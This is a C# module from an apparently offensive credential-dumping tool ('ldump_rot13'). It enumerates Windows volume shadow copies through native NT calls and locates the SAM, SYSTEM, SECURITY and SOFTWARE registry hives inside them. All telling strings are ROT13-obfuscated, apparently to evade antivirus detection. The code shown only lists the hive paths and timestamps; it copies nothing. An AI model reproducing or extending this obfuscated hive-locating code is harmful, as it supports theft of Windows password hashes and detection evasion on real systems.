//start
using System.Text;
using System.Linq;
using System;
﻿using ldump_rot13.Win32;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static ldump_rot13.Win32.Natives;

namespace ldump_rot13.Module
{
    class Shadow
    {
        const uint DIRECTORY_QUERY = 0x0001;
        const uint DIRECTORY_TRAVERSE = 0x0002;
        //const string usRootDevice = "\\Device";
        static UNICODE_STRING usRootDevice = new UNICODE_STRING();
        static UNICODE_STRING usDevice = new UNICODE_STRING();
        static OBJECT_ATTRIBUTES oaDevice = new OBJECT_ATTRIBUTES();

        static string[] INT_FILES = new string[]{ new string("FLFGRZ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("FNZ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("FRPHEVGL".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("FBSGJNER".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) };
        public static List<string> ListShadowCopies()
        {
            usDevice.Buffer = Marshal.StringToHGlobalUni(new string("Qrivpr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            usDevice.Length = 12;
            usDevice.MaximumLength = 12;

            usRootDevice.Buffer = Marshal.StringToHGlobalUni(new string("\\Qrivpr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            usRootDevice.Length = 14;
            usRootDevice.MaximumLength = 14;

            IntPtr pusRootDevice = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
            Marshal.StructureToPtr(usRootDevice, pusRootDevice,false);
            oaDevice.ObjectName = pusRootDevice;
            oaDevice.Attributes = 0;
            oaDevice.Length = (ulong)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));

            IntPtr poaDevice = Marshal.AllocHGlobal(Marshal.SizeOf(oaDevice));
            Marshal.StructureToPtr(oaDevice, poaDevice, false);

            NTSTATUS status;
            IntPtr hDeviceDirectory = IntPtr.Zero;
            byte[] buffer = new byte[40400];
            GCHandle pinnedArray = GCHandle.Alloc(buffer, GCHandleType.Pinned);
            IntPtr pbuffer = pinnedArray.AddrOfPinnedObject();
            uint Start = 0;
            uint Context = 0;
            uint ReturnLength = 0;
            bool RestartScan;
            IntPtr pDirectoryInformation = IntPtr.Zero;
            string szName, szShadowName, szFullPath;
            WIN32_FILE_ATTRIBUTE_DATA Attribute = new WIN32_FILE_ATTRIBUTE_DATA();
            List<string> res = new List<string>();
            status = (NTSTATUS)NtOpenDirectoryObject(ref hDeviceDirectory, (ACCESS_MASK)(DIRECTORY_QUERY | DIRECTORY_TRAVERSE), poaDevice);
            if (status == NTSTATUS.Success)
            {
                for (Start = 0, Context = 0, RestartScan = true, status = NTSTATUS.MoreEntries; status == NTSTATUS.MoreEntries;)
                {
                    status = (NTSTATUS)NtQueryDirectoryObject(hDeviceDirectory, buffer, (uint)buffer.Length, false, RestartScan, ref Context, ref ReturnLength);
                    if (status == NTSTATUS.Success)
                    {
                        for (int i = 0; i < (Context - Start); i++)
                        {
                            OBJECT_DIRECTORY_INFORMATION directoryInformation = Utility.ReadStruct<OBJECT_DIRECTORY_INFORMATION>(Utility.GetBytes(buffer, i* Marshal.SizeOf(typeof(OBJECT_DIRECTORY_INFORMATION)), Marshal.SizeOf(typeof(OBJECT_DIRECTORY_INFORMATION))));
                            if (RtlEqualUnicodeString(usDevice, directoryInformation.TypeName, true))
                            {
                                byte[] bytestring = new byte[directoryInformation.Name.Length];
                                Marshal.Copy(directoryInformation.Name.Buffer, bytestring, 0, directoryInformation.Name.Length);
                                szName = Encoding.Unicode.GetString(bytestring);
                                if (!string.IsNullOrEmpty(szName))
                                {
                                    if (szName.StartsWith(new string("UneqqvfxIbyhzrFunqbjPbcl".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                                    {
                                        szShadowName = string.Format("\\\\?\\GLOBALROOT\\Device\\{0}\\", szName);
                                        if (!string.IsNullOrEmpty(szShadowName))
                                        {
                                            Console.WriteLine("[*] ShadowCopy Volume : {0}", szName);
                                            Console.WriteLine("[*] | Path            : {0}", szShadowName);

                                            if (GetFileAttributesExW(szShadowName, GET_FILEEX_INFO_LEVELS.GetFileExInfoStandard, ref Attribute))
                                            {
                                                res.Add(szShadowName);
                                                Console.Write(new string("[*] | Ibyhzr YnfgJevgr: ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                                Console.WriteLine("{0:yyyy/MM/dd HH:mm:ss}", Utility.ToDateTime(Attribute.ftLastWriteTime));
                                            }
                                            else
                                            {
                                                Console.WriteLine(new string("TrgSvyrNggevohgrfRk".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                            }
                                            
                                            Console.WriteLine(new string("[*]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                            for (int j = 0; j < INT_FILES.Length; j++)
                                            {
                                                szFullPath = string.Format("{0}Windows\\System32\\config\\{1}", szShadowName, INT_FILES[j]);
                                                if (!string.IsNullOrEmpty(szFullPath))
                                                {
                                                    Console.WriteLine("[*] * {0}", szFullPath);

                                                    if (GetFileAttributesExW(szFullPath, GET_FILEEX_INFO_LEVELS.GetFileExInfoStandard, ref Attribute))
                                                    {
                                                        Console.Write(new string("[*]   | YnfgJevgr   : ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                                        Console.WriteLine("{0:yyyy/MM/dd HH:mm:ss}", Utility.ToDateTime(Attribute.ftLastWriteTime));
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine(new string("TrgSvyrNggevohgrfRk".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                                    }
                                                    
                                                }
                                            }
                                            Console.WriteLine(new string("[*]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                        }
                                    }
                                }
                            }
                        }
                        Start = Context;
                        RestartScan = false;
                    }
                    else
                    {
                        Console.WriteLine("NtQueryDirectoryObject: {0}", status);
                    }
                    
                }
                CloseHandle(hDeviceDirectory);
            }
            else
            {
                Console.WriteLine("NtOpenDirectoryObject: {0}", status);
            }
            
            return res;
        }
    }
}
